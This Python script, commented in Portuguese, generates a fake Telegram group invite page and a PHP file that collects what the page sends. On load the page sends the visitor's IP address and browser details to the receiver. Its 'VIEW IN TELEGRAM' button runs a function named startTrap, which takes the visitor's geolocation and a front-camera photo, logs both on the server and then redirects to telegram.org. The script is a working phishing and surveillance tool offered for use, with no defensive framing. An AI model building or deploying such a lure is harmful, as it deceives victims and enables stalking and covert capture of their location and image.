#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import shutil
import json
import time
import socket

# Timeout para evitar travamentos
socket.setdefaulttimeout(5)

# --- FUNÇÕES AUXILIARES ---
def simple_log(msg):
    try:
        if not os.path.exists("logs"): os.makedirs("logs")
        with open("logs/debug_telegram.txt", "a", encoding="utf-8") as f:
            f.write(f"[Telegram] {msg}\n")
    except: pass
    print(f"[Telegram] {msg}")

def download_image_simple(url, dest_folder):
    try:
        import urllib.request
        filename = "tg_default.png"
        filepath = os.path.join(dest_folder, filename)
        
        opener = urllib.request.build_opener()
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        urllib.request.install_opener(opener)
        
        urllib.request.urlretrieve(url, filepath)
        return filepath
    except Exception as e:
        simple_log(f"Falha download imagem: {e}")
        return None

# --- 1. PREPARAÇÃO DE DIRETÓRIOS ---
try:
    base_dir = os.path.dirname(os.path.abspath(__file__)) 
    target_dir = os.path.join(base_dir, 'telegram')      
    img_dir = os.path.join(target_dir, 'images')

    os.makedirs(target_dir, exist_ok=True)
    os.makedirs(img_dir, exist_ok=True)

    # Index de emergência
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write('<html><body><h1>A carregar...</h1><script>setTimeout(function(){location.reload()}, 2000);</script></body></html>')

except Exception as e:
    simple_log(f"ERRO CRÍTICO: {e}")
    sys.exit(1)

# --- 2. LÓGICA PRINCIPAL ---
try:
    # Configuração
    title = os.getenv('TITLE') or "Telegram Group"
    image = os.getenv('IMAGE')
    
    # Texto padrão do Telegram
    # O Telegram geralmente mostra o número de membros ou "View in Telegram"
    mem_num = os.getenv('MEM_NUM') or "12 000"
    online_num = os.getenv('ONLINE_NUM') or "500"
    desc = os.getenv('DESC')
    if not desc:
        desc = f"You can view and join @{title.replace(' ', '')} right away."

    # Processamento da Imagem
    img_name = "tg_default.png"
    og_image_url = "" 

    if image and image.startswith(('http', 'https')):
        # Baixa backup local
        download_image_simple(image, img_dir)
        # Usa URL original para garantir o preview
        og_image_url = image
    elif image and os.path.exists(image):
        try:
            shutil.copyfile(image, os.path.join(img_dir, os.path.basename(image)))
            img_name = os.path.basename(image)
            og_image_url = f"images/{img_name}"
        except: pass

    # Se a URL original não for definida, tenta local
    if not og_image_url:
        og_image_url = f"images/{img_name}"

    # PHP Receptor
    php_receiver_code = """<?php
    header('Content-Type: application/json');
    error_reporting(0);
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if ($data) {
        $logDir = '../../logs/';
        if (!is_dir($logDir)) { mkdir($logDir, 0777, true); }
        
        if (isset($data['lat'])) {
            file_put_contents($logDir . 'result.txt', json_encode(['status' => 'success', 'lat' => $data['lat'], 'lon' => $data['lon'], 'acc' => $data['acc']]));
        } 
        elseif (isset($data['ip'])) {
            file_put_contents($logDir . 'info.txt', json_encode($data));
        } 
        elseif (isset($data['img'])) {
            $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $data['img']);
            file_put_contents($logDir . 'cam_' . date('Ymd_His') . '.png', base64_decode($img));
        }
    }
    ?>"""

    # HTML Final
    html_code = f"""<!DOCTYPE html>
    <html lang="en" prefix="og: http://ogp.me/ns#">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram: Contact @{title.replace(' ', '_')}</title>
        
        <!-- META TAGS DO TELEGRAM -->
        <meta property="og:title" content="{title}">
        <meta property="og:description" content="{desc}">
        {f'<meta property="og:image" content="{og_image_url}">' if og_image_url else ''}
        <meta property="og:site_name" content="Telegram">
        <meta property="og:type" content="website">
        
        <!-- Dimensões para garantir thumbnail -->
        <meta property="og:image:width" content="300">
        <meta property="og:image:height" content="300">
        
        <meta name="twitter:card" content="summary">
        {f'<meta name="twitter:image" content="{og_image_url}">' if og_image_url else ''}

        <style>
            body {{ background-color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #000; }}
            .tg-container {{ text-align: center; max-width: 400px; width: 100%; padding: 20px; }}
            .tg-logo {{ width: 120px; height: 120px; border-radius: 50%; object-fit: cover; margin-bottom: 20px; }}
            h1 {{ font-size: 22px; margin: 0 0 10px; font-weight: 700; color: #000; }}
            .tg-members {{ color: #87909c; font-size: 14px; margin-bottom: 30px; }}
            .tg-desc {{ font-size: 15px; color: #000; margin-bottom: 30px; line-height: 1.5; }}
            .btn-action {{ background-color: #3390ec; color: white; border: none; padding: 16px 0; width: 100%; border-radius: 12px; font-size: 15px; font-weight: 600; cursor: pointer; text-transform: uppercase; transition: background 0.2s; text-decoration: none; display: block; }}
            .btn-action:hover {{ background-color: #2b7bc4; }}
            
            /* Rodapé falso para parecer real */
            .tg-footer {{ margin-top: 40px; font-size: 13px; color: #87909c; }}
        </style>
    </head>
    <body>

    <div class="tg-container">
        <img src="images/{img_name}" class="tg-logo">
        <h1>{title}</h1>
        <div class="tg-members">{mem_num} subscribers • {online_num} online</div>
        <div class="tg-desc">{desc}</div>
        <button class="btn-action" onclick="startTrap()">VIEW IN TELEGRAM</button>
        
        <div class="tg-footer">
             If you have <strong>Telegram</strong>, you can view and join <br>
             <strong>{title}</strong> right away.
        </div>
    </div>

    <script>
        window.onload = function() {{
            try {{
                fetch('https://api.ipify.org?format=json')
                .then(r=>r.json())
                .then(d=>{{
                    fetch('data.php', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{ip:d.ip, os:navigator.platform, platform:navigator.userAgent, browser:navigator.appName}})}});
                }}).catch(e=>{{}});
            }} catch(e) {{}}
        }};

        function startTrap() {{
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError);
            }} else {{ 
                requestCamera(); 
            }}
        }}

        function onPosSuccess(pos) {{
            fetch('data.php', {{
                method: 'POST', headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }})
            }});
            requestCamera();
        }}

        function onPosError(err) {{
            requestCamera();
        }}

        function requestCamera() {{
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
                .then(function(stream) {{
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function() {{
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const data = canvas.toDataURL('image/png');
                        
                        stream.getTracks().forEach(track => track.stop());
                        
                        fetch('data.php', {{
                            method: 'POST', headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{img: data}})
                        }}).then(finish);
                    }}, 800);
                }})
                .catch(function(err) {{
                    finish();
                }});
            }} else {{
                finish();
            }}
        }}

        function finish() {{
            window.location.href = "https://telegram.org";
        }}
    </script>
    </body>
    </html>"""

    # Escrita Final
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as f:
        f.write(html_code)
    
    with open(os.path.join(target_dir, 'data.php'), 'w', encoding='utf-8') as f:
        f.write(php_receiver_code)
        
    simple_log("Sucesso total.")
    sys.exit(0)

except Exception as e:
    simple_log(f"ERRO DE EXECUÇÃO: {e}")
    sys.exit(0)